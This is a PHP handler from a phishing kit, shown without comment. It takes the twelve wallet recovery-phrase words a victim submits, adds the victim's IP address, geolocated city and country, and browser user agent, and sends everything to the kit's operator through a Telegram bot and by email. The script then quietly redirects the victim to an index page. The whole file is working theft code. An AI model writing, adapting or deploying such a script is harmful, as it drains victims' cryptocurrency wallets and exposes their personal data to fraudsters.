<?php 
$browser = $_SERVER['HTTP_USER_AGENT'];
include('./function.php');
require_once('geoplugin.class.php');

$geoplugin = new geoPlugin();

//get user's ip address 
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 

function sendMessage($token, $chatid, $message) {
    $url = "https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chatid}&text=";
    $url .= urlencode($message);
    $ch = curl_init();
    $options = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $options);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
	}
	

$message .= "---------------| 12 Phrase|---------------\n";
$message .= "1: " . $_POST['word1'] . "\n"; 
$message .= "2: " . $_POST['word2'] . "\n"; 
$message .= "3: " . $_POST['word3'] . "\n"; 
$message .= "4: " . $_POST['word4'] . "\n"; 
$message .= "5: " . $_POST['word5'] . "\n"; 
$message .= "6: " . $_POST['word6'] . "\n"; 
$message .= "7: " . $_POST['word7'] . "\n"; 
$message .= "8: " . $_POST['word8'] . "\n"; 
$message .= "9: " . $_POST['word9'] . "\n"; 
$message .= "10: " . $_POST['word10'] . "\n";
$message .= "11: " . $_POST['word11'] . "\n";
$message .= "12: " . $_POST['word12'] . "\n";
$message .= "IP : " .$ip. "\n";
$message .= "--------------------------------------------\n";
$message .= 	"City: {$geoplugin->city}\n";
$message .= 	"Region: {$geoplugin->region}\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .= "User-Agent: ".$browser."\n";
$message .= "---------------------------------------------\n";

$hi = mail($to,$emailprovider."EDD Card| ".$ip , $message);

$response;
// now execute it:
$result = json_decode(sendMessage($token, $chatid, $message));
if(isset($result->ok) && $result->ok) {
    $response['body'] = 'Congratulations, the message was successfully sent';
} elseif (!$result->ok) {
    $response['error'] = true;
    $response['body'] = $result->error_code . ': ' . $result->description;
} else {
    $response['error'] = true;
    $response['body'] = 'Unknown error. Sorry :(';
};

?> 
<script type="text/javascript"> 
<!-- 
   window.location="./index.html"

</script> 
<?php	

  ?> 
<script type="text/javascript">

</script> 
<?php	
fclose($handle); 
exit; 
?> 
